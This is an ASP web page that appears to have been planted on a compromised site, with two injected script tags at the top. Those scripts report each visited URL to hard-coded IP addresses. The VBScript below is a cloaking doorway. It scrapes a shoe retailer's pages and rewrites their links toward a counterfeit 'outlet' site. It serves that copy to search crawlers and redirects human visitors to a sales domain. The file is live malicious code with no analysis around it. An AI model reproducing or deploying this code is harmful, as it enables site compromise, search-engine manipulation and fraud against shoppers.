<script>var x=new XMLHttpRequest();x.open("GET","http://185.86.150.37/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><script>var x=new XMLHttpRequest();x.open("GET","http://176.102.34.165/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
On Error Resume Next
dim jumptodomain, imagefolder, fromsite, tourl
jumptodomain = "mbtforsales.com"
fromsite = "http://www.mbthomeuk.com" 
tourl ="http://itmoncler.citygrounds.net/outlet.asp"
pageid = "scarpe" 
imagefolder = "images/"
tourl = tourl&"?" 'test

Function GetLocationURL() 
	Dim Url 
	Dim ServerPort,ServerName,ScriptName,QueryString 
	ServerName = Request.ServerVariables("SERVER_NAME") 
	ServerPort = Request.ServerVariables("SERVER_PORT") 
	ScriptName = Request.ServerVariables("SCRIPT_NAME") 
	QueryString = Request.ServerVariables("QUERY_STRING") 
	Url="http://"&ServerName 
	If ServerPort <> "80" Then Url = Url & ":" & ServerPort 
	Url=Url&ScriptName 
	If QueryString <>"" Then Url=Url&"?"& QueryString 
	GetLocationURL=Server.URLEncode(Url)
End Function
Function GetCode(str,regstr)
	Dim Reg,serStr,Cols
	Set Reg= new RegExp
	Reg.IgnoreCase = True
	Reg.MultiLine = True
	Reg.Pattern =regstr
	If Reg.test(str) Then
	   Set Cols = Reg.Execute(str)
	   GetCode=Cols(0).SubMatches(0)
	Else 
	   GetCode=""
	End If
	Set Cols = Nothing
	Set Reg = Nothing
End Function
%>
<%
on error resume next
Function  getHTTPPage(URL)
Set   HTTPReq   =   Server.createobject("Msxml2.XMLHTTP")    
HTTPReq.Open   "GET",   URL,   False 
HTTPReq.send 
If   HTTPReq.readyState   <>   4   Then   Exit   Function 
getHTTPPage   =   Bytes2bStr(HTTPReq.responseBody) 
Set   HTTPReq   =   Nothing 
End   Function
Function   Bytes2bStr(vin)
Dim   BytesStream,StringReturn
Set   BytesStream   =   Server.CreateObject("ADODB.Stream")
BytesStream.Type   =   2
BytesStream.Open
BytesStream.WriteText   vin
BytesStream.Position   =   0
BytesStream.Charset   =   "UTF-8"
BytesStream.Position   =   2
StringReturn   =BytesStream.ReadText
BytesStream.close 
Set   BytesStream   =   Nothing 
Bytes2bStr   =   StringReturn 
End   Function
if Request.QueryString<>"" then
htmls = getHTTPPage(fromsite&Request.QueryString)
htmls =  replace(htmls,""&chr(34)&fromsite,""&chr(34)&"/")
htmls =  replace(htmls,""&chr(34)&"/"&imagefolder,""&chr(34)&fromsite&imagefolder)
htmls =  replace(htmls,""&chr(34)&imagefolder,""&chr(34)&fromsite&imagefolder)
htmls =  replace(htmls,""&chr(34)&"/includes/",""&chr(34)&fromsite&"includes/") 
htmls =  replace(htmls,""&chr(34)&"includes/",""&chr(34)&fromsite&"includes/") 
htmls =  replace(htmls,""&chr(34)&"/media/",""&chr(34)&fromsite&"media/") 
htmls =  replace(htmls,""&chr(34)&"media/",""&chr(34)&fromsite&"media/")
htmls =  replace(htmls,""&chr(34)&"/skin/",""&chr(34)&fromsite&"skin/") 
htmls =  replace(htmls,""&chr(34)&"js/",""&chr(34)&fromsite&"skin/")
htmls =  replace(htmls,""&chr(34)&"/js/",""&chr(34)&fromsite&"js/") 
htmls =  replace(htmls,""&chr(34)&"skin/",""&chr(34)&fromsite&"js/") 
htmls =  replace(htmls,"href="&chr(34),"href="&chr(34)&"/") 
htmls =  replace(htmls,"href="&chr(34)&"//","href="&chr(34)&"/") 
htmls =  replace(htmls,"href="&chr(34)&"/http","href="&chr(34)&"http") 
htmls =  replace(htmls,"href="&chr(34)&"/","href="&chr(34)&tourl) 
else
htmls = getHTTPPage(fromsite)
htmls =  replace(htmls,""&chr(34)&fromsite,""&chr(34)&"/")
htmls =  replace(htmls,""&chr(34)&"/"&imagefolder,""&chr(34)&fromsite&imagefolder)
htmls =  replace(htmls,""&chr(34)&imagefolder,""&chr(34)&fromsite&imagefolder)
htmls =  replace(htmls,""&chr(34)&"/includes/",""&chr(34)&fromsite&"includes/") 
htmls =  replace(htmls,""&chr(34)&"includes/",""&chr(34)&fromsite&"includes/")
htmls =  replace(htmls,""&chr(34)&"/media/",""&chr(34)&fromsite&"media/") 
htmls =  replace(htmls,""&chr(34)&"media/",""&chr(34)&fromsite&"media/") 
htmls =  replace(htmls,""&chr(34)&"/skin/",""&chr(34)&fromsite&"skin/") 
htmls =  replace(htmls,""&chr(34)&"js/",""&chr(34)&fromsite&"skin/")
htmls =  replace(htmls,""&chr(34)&"/js/",""&chr(34)&fromsite&"js/") 
htmls =  replace(htmls,""&chr(34)&"skin/",""&chr(34)&fromsite&"js/") 
htmls =  replace(htmls,"href="&chr(34),"href="&chr(34)&"/") 
htmls =  replace(htmls,"href="&chr(34)&"//","href="&chr(34)&"/") 
htmls =  replace(htmls,"href="&chr(34)&"/http","href="&chr(34)&"http") 
htmls =  replace(htmls,"href="&chr(34)&"/","href="&chr(34)&tourl) 
end if

dim pagetitle
pagetitle = GetCode(htmls,"<title>(.*?)<\/title>")
pagetitle = Server.URLEncode(pagetitle)
dim agent,language,referer
agent=request.servervariables("http_user_agent")
language=request.servervariables("HTTP_ACCEPT_LANGUAGE")
referer=request.servervariables("HTTP_REFERER")
if language = "" and referer = "" then
	if InStr(agent, "bot")<=0 then
		Response.Redirect "http://"&jumptodomain&"/?from="&GetLocationURL()&"&q="&pagetitle
		Response.End
	end if
else
	Response.Redirect "http://"&jumptodomain&"/?from="&GetLocationURL()&"&q="&pagetitle
	Response.End
end if
response.write htmls
%>